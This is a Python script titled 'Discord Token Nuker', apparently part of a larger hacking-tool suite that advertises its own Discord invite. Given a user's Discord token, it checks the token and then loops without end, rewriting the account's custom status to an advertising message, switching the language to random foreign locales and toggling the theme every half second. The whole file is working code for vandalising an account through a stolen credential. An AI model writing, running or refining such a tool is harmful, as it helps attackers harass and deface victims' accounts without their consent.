from Config.Util import *
from Config.Config import *
try:
    import requests
    import time
    import requests
    import time
    from itertools import cycle
    import random
except Exception as e:
   ErrorModule(e)
   

Title("Discord Token Nuker")

try:
    print()
    token = Choice1TokenDiscord()
    custom_status_input = input(f"{BEFORE + current_time_hour() + AFTER} {INPUT} Custom Status -> {reset}")

    headers = {'Authorization': token, 'Content-Type': 'application/json'}
    response = requests.get('https://discord.com/api/v8/users/@me', headers=headers)
    if response.status_code != 200:
        ErrorToken()

    default_status = f"Nuking By https://dsc.gg/redtigersq"
    custom_status = f"{custom_status_input} | https://dsc.gg/redtigersq"
        
    modes = cycle(["light", "dark"])

    while True:

        CustomStatus_default = {"custom_status": {"text": default_status}}
        try:
            r = requests.patch("https://discord.com/api/v9/users/@me/settings", headers=headers, json=CustomStatus_default)
            print(f"{red}[{white}{current_time_hour()}{red}] {ADD} Status: {color.WHITE}Changed{color.RED} | Status Discord: {color.WHITE}{default_status}{color.RED}")
        except Exception as e:
            print(f"{red}[{white}{current_time_hour()}{red}] {ERROR} Status: {color.WHITE}Error {e}{color.RED} | Status Discord: {color.WHITE}{default_status}{color.RED}")

        for _ in range(5):
            try:
                random_language = random.choice(['ja', 'zh-TW', 'ko', 'zh-CN', 'th', 'uk', 'ru', 'el', 'cs'])
                setting = {'locale': random_language}
                requests.patch("https://discord.com/api/v7/users/@me/settings", headers=headers, json=setting)
                print(f"{red}[{white}{current_time_hour()}{red}] {ADD} Status: {color.WHITE}Changed{color.RED} | Language: {color.WHITE}{random_language}{color.RED}")
            except:
                print(f"{red}[{white}{current_time_hour()}{red}] {ERROR} Status:  {color.WHITE}Error{color.RED}  | Language: {color.WHITE}{random_language}{color.RED}")
        
            try:
                theme = next(modes)
                setting = {'theme': theme}
                requests.patch("https://discord.com/api/v8/users/@me/settings", headers=headers, json=setting)
                print(f"{red}[{white}{current_time_hour()}{red}] {ADD} Status: {color.WHITE}Changed{color.RED} | Theme: {color.WHITE}{theme}{color.RED}")
            except:
                print(f"{red}[{white}{current_time_hour()}{red}] {ERROR} Status:  {color.WHITE}Error{color.RED}  | Theme: {color.WHITE}{theme}{color.RED}")
            time.sleep(0.5)


        CustomStatus_custom = {"custom_status": {"text": custom_status}}
        try:
            r = requests.patch("https://discord.com/api/v9/users/@me/settings", headers=headers, json=CustomStatus_custom)
            print(f"{red}[{white}{current_time_hour()}{red}] {ADD} Status: {color.WHITE}Changed{color.RED} | Status Discord: {color.WHITE}{custom_status}{color.RED}")
        except Exception as e:
            print(f"{red}[{white}{current_time_hour()}{red}] {ERROR} Status: {color.WHITE}Changed{color.RED} | Status Discord: {color.WHITE}{custom_status}{color.RED}")
        
        for _ in range(5):
            try:
                random_language = random.choice(['ja', 'zh-TW', 'ko', 'zh-CN', 'th', 'uk', 'ru', 'el', 'cs'])
                setting = {'locale': random_language}
                requests.patch("https://discord.com/api/v7/users/@me/settings", headers=headers, json=setting)
                print(f"{red}[{white}{current_time_hour()}{red}] {ADD} Status: {color.WHITE}Changed{color.RED} | Language: {color.WHITE}{random_language}{color.RED}")
            except:
                print(f"{red}[{white}{current_time_hour()}{red}] {ERROR} Status:  {color.WHITE}Error{color.RED}  | Language: {color.WHITE}{random_language}{color.RED}")
        
            try:
                theme = next(modes)
                setting = {'theme': theme}
                requests.patch("https://discord.com/api/v8/users/@me/settings", headers=headers, json=setting)
                print(f"{red}[{white}{current_time_hour()}{red}] {ADD} Status: {color.WHITE}Changed{color.RED} | Theme: {color.WHITE}{theme}{color.RED}")
            except:
                print(f"{red}[{white}{current_time_hour()}{red}] {ERROR} Status:  {color.WHITE}Error{color.RED}  | Theme: {color.WHITE}{theme}{color.RED}")
            time.sleep(0.5)
except Exception as e:
    Error(e)